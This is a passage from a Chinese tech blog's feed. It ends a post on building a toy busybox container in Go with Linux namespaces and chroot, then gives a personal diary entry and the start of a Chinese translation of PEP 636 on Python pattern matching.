&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果：&lt;/p>
&lt;pre>&lt;code>/ # ps -ef
PID USER TIME COMMAND
1 0 0:00 /bin/ash
2 0 0:00 ps -ef
/ # ls
bin linuxrc proc sbin usr
/ # mount
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
/ #
&lt;/code>&lt;/pre>&lt;h2 id="用-go-实现">用 go 实现&lt;/h2>
&lt;h3 id="syscall">syscall&lt;/h3>
&lt;p>go 对系统调用其实做了不少封装，基本在 &lt;code>os&lt;/code> 和 &lt;code>syscall&lt;/code> 下，但有很多区别。比如在 go 里找不到 &lt;code>clone&lt;/code>、&lt;code>setns&lt;/code> 这些接口，取而代之的是 &lt;code>os/exec&lt;/code> 下的 &lt;code>Cmd&lt;/code> 结构。不过 &lt;code>syscall.Unshare&lt;/code> 倒是很忠实的还原了。诸如 &lt;code>CLONE_NEWNS&lt;/code> 这些常量也可以找到对应的 &lt;code>syscall.CLONE_NEWNS&lt;/code>。&lt;/p>
&lt;p>不重复上面的代码了，写一个简短的启动 busybox 容器的 go 程序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;os/exec&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;syscall&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="nx">flagBootstrap&lt;/span> &lt;span class="kt">bool&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BoolVar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">flagBootstrap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bootstrap&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bootstrap busybox container&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">runBusybox&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Start `busybox ash` in process %d\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Getpid&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">cmd&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">exec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/busybox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;ash&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdin&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdin&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdout&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdout&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Env&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;PATH=/bin:/sbin:/usr/bin:/usr/sbin&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Chroot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;workspace&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Chdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Mount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;proc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;/proc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;proc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Run&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unmount proc&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Unmount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;proc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">runContainerizedCommand&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">cmd&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">exec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Command&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/proc/self/exe&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Path&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s">&amp;#34;/proc/self/exe&amp;#34;&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;-bootstrap&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdin&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdin&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdout&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdout&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span>
&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SysProcAttr&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SysProcAttr&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Cloneflags&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CLONE_NEWUTS&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CLONE_NEWNS&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CLONE_NEWPID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Unshareflags&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CLONE_NEWNS&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;starting current process %d\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Getpid&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nf">must&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Run&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Parse&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">flagBootstrap&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">runBusybox&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nf">runContainerizedCommand&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>保存为 &lt;code>demo.go&lt;/code> 后用 &lt;code>go build -o demo demo.go&lt;/code> 编译，然后执行 &lt;code>sudo ./demo&lt;/code> 。&lt;/p>
&lt;p>结果像是这样：&lt;/p>
&lt;pre>&lt;code>DESKTOP-HEKKTQ9 :: ~/repos/container » sudo ./demo
starting current process 2954
Start `busybox ash` in process 1
/ # ps -ef
PID USER TIME COMMAND
1 0 0:00 /proc/self/exe -bootstrap
6 0 0:00 /bin/busybox ash
7 0 0:00 ps -ef
/ # mount
proc on /proc type proc (rw,relatime)
/ #
unmount proc
DESKTOP-HEKKTQ9 :: ~/repos/container »
&lt;/code>&lt;/pre>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>上面的 demo 仅仅是创建了一个看起来像容器的玩具，连 cgroup 都没有，距离真正的 OCI 运行时还有不小差距。不过已经足够展示创建一个隔离的环境并不是特别困难的事情，这必须感谢 Linux 内核的开发者们让容器技术有了存在的可能，而且还能这么简单地使用。&lt;/p>
&lt;p>可以点击[这个链接](&lt;a class="link" href="https://github.com/opencontainers/runtime-spec/blob/master/spec.md" target="_blank" rel="noopener"
>runtime-spec/spec.md at master · opencontainers/runtime-spec (github.com)&lt;/a>)查看 OCI 运行时的规格说明。&lt;/p>
&lt;p>涉及概念：&lt;/p>
&lt;ul>
&lt;li>namespace&lt;/li>
&lt;/ul>
&lt;p>重要系统调用&lt;/p>
&lt;ul>
&lt;li>&lt;code>clone&lt;/code>&lt;/li>
&lt;li>&lt;code>setns&lt;/code>&lt;/li>
&lt;li>&lt;code>unshare&lt;/code>&lt;/li>
&lt;li>&lt;code>mount&lt;/code>&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>本篇还不涉及网络，仅在文件系统和 PID、用户等层级做了隔离。网络隔离可以参考 &lt;code>man 7 network_namespaces&lt;/code> ，不过谷歌搜了一大圈也还没找到怎么创建虚拟网卡，暂且先放着了。&lt;/p></description></item><item><title>2021-04-25 无事发生</title><link>https://nnnewb.github.io/blog/p/2021-04-25-%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F/</link><pubDate>Sun, 25 Apr 2021 10:40:30 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/2021-04-25-%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F/</guid><description>&lt;p>4月25日好像也不是什么节日，对我个人来说也没有什么特殊意义。仅仅是普通的一天——如果不算五一调休导致今天明明是周日但还要上班这一点的话。&lt;/p>
&lt;p>想想也挺不可思议的，不知不觉已经到2021年这个在不少科学幻想中的“未来”时代了，光算工作年限，我也干了有四五年的程序了吧。&lt;/p>
&lt;p>从最开始抱着“不写代码还能干啥”到“写代码也挺不错的”，再到现在，“还能写几年代码呢”。&lt;/p>
&lt;p>反思一下这几年，几乎没干出什么成绩，工作一年一换，工作几年下来，也没几个认识、熟悉到可以称之为“朋友”的人。倒不是我孤僻（这么说的人一般都确实孤僻吧），主要是确实没什么主观能动性。&lt;/p>
&lt;p>如今这家公司写写 go，折腾折腾 kubernetes，也算清闲，反倒开始忧心起将来了。&lt;/p>
&lt;p>现在的工作，说好，也就那样。说不好，这个大环境下，但凡没失业，我觉得都算不上不好吧。&lt;/p>
&lt;p>又是疫情，又是新冷战，又是各种各样的奇葩事。当笑话看，看久了也笑不出来了。&lt;/p>
&lt;p>我这人爱看小说，以前也是动画漫画来者不拒，特效大片就饭，总之蛮快乐的。过去还写过同人小说，可惜没得家里支持，最后也就是40万字左右就切了。&lt;/p>
&lt;p>不过起码这段经历算是给我找第一份码农工作加了点助力（大概）。自从开始写代码拿工资，好像写小说这回事就和我没什么关系了的样子。&lt;/p>
&lt;p>不过我还是一直想写的，几乎每次换工作，心里想的都是空闲的时间多了，就会用来做点有意义的事情。比如学学钢琴啊（买了电钢琴吃灰中），比如写写小说啊（也就开了个头），比如学点新技术啊（有倒是有，新工作新技术栈），总之就是自我提升下。&lt;/p>
&lt;p>结果当然是没有的。&lt;/p>
&lt;p>好像从前读书的时候捧着本 C Primer Plus/C++ Primer 看的激情已经完全从身体里消失了一样。不管是什么事情，虽然总是想到，啊，这个想要，那个想要。但一到行动，就完全没了动力。“做了也没用”，“学了也是浪费时间”这种想法就从脑子里冒出来了。&lt;/p>
&lt;p>不能说和家庭完全没关系——但把责任都推给父母、老师，大概也不合适。&lt;/p>
&lt;p>我是相信环境会改变人的，当然人也能发挥主观能动性，改造环境。像是叶子随波逐流进了下水道，不能说是水有错，也不能怪叶子没有奋力闪躲，秋风更是无辜。于是环视四周，最后悲哀地发现只能感叹一句命运无常。&lt;/p>
&lt;p>诸如未来可以改变之类的鸡汤喝了又喝，脑子也有了抗性，不切实际的期待也越来越少，然后发现即使是切实可行的期待也开始落向不切实际的一侧。&lt;/p>
&lt;p>那便不想未来了吧。俗话说，“把握当下”。于是便来上班，对着屏幕，无事可做，等待 call of work。&lt;/p>
&lt;p>那便是这样了吧。&lt;/p>
&lt;p>2021年4月25日，无事发生。&lt;/p></description></item><item><title>pattern-match-in-python310</title><link>https://nnnewb.github.io/blog/p/pattern-match-in-python310/</link><pubDate>Fri, 19 Mar 2021 10:19:06 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/pattern-match-in-python310/</guid><description>&lt;h2 id="说明">说明&lt;/h2>
&lt;p>简单机翻润色一下 PEP-636&lt;/p>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>这个PEP是PEP 634引入的模式匹配教程。&lt;/p>
&lt;p>PEP 622提出了模式匹配的语法，社区和指导委员会对此进行了详细讨论。一个常见的问题是解释(和学习)这个特性是否容易。这个PEP关注的是提供开发人员可以用来学习Python中的模式匹配的文档类型。&lt;/p>
&lt;p>PEP 636 被认为是PEP 634(模式匹配的技术规范)和PEP 635(模式匹配的添加动机和理由与设计考虑)的支持材料。&lt;/p>
&lt;p>对于想要快速回顾而不是教程的读者，请参阅附录a。&lt;/p>
&lt;h2 id="教程">教程&lt;/h2>
&lt;p>作为本教程的一个例子，你将编写一个文本冒险游戏。这是一种互动小说形式，用户输入文本命令与虚构世界进行互动，并接收关于所发生事情的文本描述。命令将是简化形式的自然语言，如&lt;code>get sword&lt;/code>，&lt;code>attack dragon&lt;/code>，&lt;code>go north&lt;/code>，&lt;code>enter shop&lt;/code>或&lt;code>but cheese&lt;/code>。&lt;/p>
&lt;h3 id="匹配序列">匹配序列&lt;/h3>
&lt;p>你的主循环将需要从用户那里获取输入，并将它分割成单词，例如一个像这样的字符串列表:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">command&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;What are you doing next? &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># analyze the result of command.split()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>下一步是解读这些单词。我们的大多数命令都有两个词:一个动作和一个对象。所以你可能会忍不住这样做:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="p">[&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># interpret action, obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这行代码的问题在于它遗漏了一些东西：如果用户输入的单词多于或少于2个单词怎么办?为了防止这个问题，您可以检查单词列表的长度，或者捕获上面的语句将引发的&lt;code>ValueError&lt;/code>。&lt;/p>
&lt;p>或者，你可以使用&lt;code>match&lt;/code>语句来代替:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># interpret action, obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>match&lt;/code>语句计算**“subject”**(&lt;code>match&lt;/code>关键字后面的值)，并根据模式(&lt;code>case&lt;/code>旁边的代码)检查它。一个模式可以做两件不同的事情:&lt;/p>
&lt;ul>
&lt;li>验证 subject 具有一定的结构。在您的示例中，&lt;code>[action, obj]&lt;/code>模式匹配任何恰好包含两个元素的序列。这叫做 &lt;strong>maching&lt;/strong>。&lt;/li>
&lt;li>它将模式中的一些名称绑定到 subject 的组件元素。在本例中，如果列表有两个元素，它将绑定&lt;code>action = subject[0]&lt;/code>和&lt;code>obj = subject[1]&lt;/code>。&lt;/li>
&lt;/ul>
&lt;p>如果匹配，则&lt;code>case&lt;/code>块内的语句将与绑定的变量一起执行。如果没有匹配，则什么也不发生，然后执行&lt;code>match&lt;/code>之后的语句。&lt;/p>
&lt;p>注意，与解包赋值(unpacking assignments)的方式类似，您可以使用圆括号、方括号或逗号分隔，它们含义相同。所以你可以写&lt;code>case action, obj&lt;/code>或者&lt;code>case (action, obj)&lt;/code>。上述任意形式都将匹配序列类型(例如&lt;code>list&lt;/code>或&lt;code>tuple&lt;/code>)。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># 译者补充，下述case等效&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="c1"># match (1,2,3) 也一样&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="匹配多个模式">匹配多个模式&lt;/h3>
&lt;p>即使大多数命令都是动作/对象形式，你也可能想要不同长度的用户命令。例如，你可能希望添加没有对象(如&lt;code>look&lt;/code>或&lt;code>quit&lt;/code>)的单个动词。一个&lt;code>match&lt;/code>语句可以(而且很可能)有不止一种情况:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># interpret single-verb action&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># interpret action, obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>match&lt;/code>语句将从上到下检查模式。如果模式与 subject 不匹配，将尝试下一个模式。但是，一旦找到第一个匹配的模式，就会执行该&lt;code>case&lt;/code>的主体，并忽略所有后续的&lt;code>case&lt;/code>。这类似于&lt;code>if&lt;/code>/&lt;code>elif&lt;/code>/&lt;code>elif&lt;/code>/…语句的工作方式。&lt;/p>
&lt;h3 id="匹配特定值">匹配特定值&lt;/h3>
&lt;p>你的代码仍然需要查看特定的操作，并根据特定的操作有条件地执行不同的逻辑(例如，&lt;code>quit&lt;/code>、&lt;code>attack&lt;/code>或&lt;code>buy&lt;/code>)。你可以使用&lt;code>if&lt;/code>/&lt;code>elif&lt;/code>/&lt;code>elif&lt;/code>/…，或者使用函数字典，但是这里我们将利用模式匹配来解决这个任务。除了变量，你可以在模式中使用字面值(如&lt;code>&amp;quot;quit&amp;quot;&lt;/code>、&lt;code>42&lt;/code>或&lt;code>None&lt;/code>)。这允许你这样写:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;quit&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Goodbye!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">quit_game&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;look&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">describe&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="n">character&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">direction&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="n">current_room&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">neighbor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">direction&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># The rest of your commands go here&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>像&lt;code>[&amp;quot;get&amp;quot;， obj]&lt;/code>这样的模式将只匹配第一个元素等于&lt;code>&amp;quot;get&amp;quot;&lt;/code>的2个元素的序列。它还将绑定&lt;code>obj = subject[1]&lt;/code>。&lt;/p>
&lt;p>正如您在上述代码的&lt;code>go&lt;/code>模式中看到的，我们还可以在不同的模式中使用不同的变量名。&lt;/p>
&lt;p>除了与&lt;code>is&lt;/code>操作符比较的常量&lt;code>True&lt;/code>、&lt;code>False&lt;/code>和&lt;code>None&lt;/code>之外，其他字面值是用&lt;code>==&lt;/code>操作符比较的。&lt;/p>
&lt;h3 id="匹配多个值">匹配多个值&lt;/h3>
&lt;p>玩家可以通过使用一系列的命令来投掷多个物品，如:&lt;code>drop key&lt;/code>, &lt;code>drop sword&lt;/code>, &lt;code>drop cheese&lt;/code>。这个接口可能很麻烦，您可能希望允许在一个命令中添加多个项，比如&lt;code>drop key sword cheese&lt;/code>。在这种情况下，你事先不知道命令中有多少个单词，但是你可以在模式中使用扩展解包(extended unpacking)，就像它们在解包赋值里的写法:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;drop&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">objects&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">obj&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">objects&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">character&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">drop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="p">)&lt;/span>
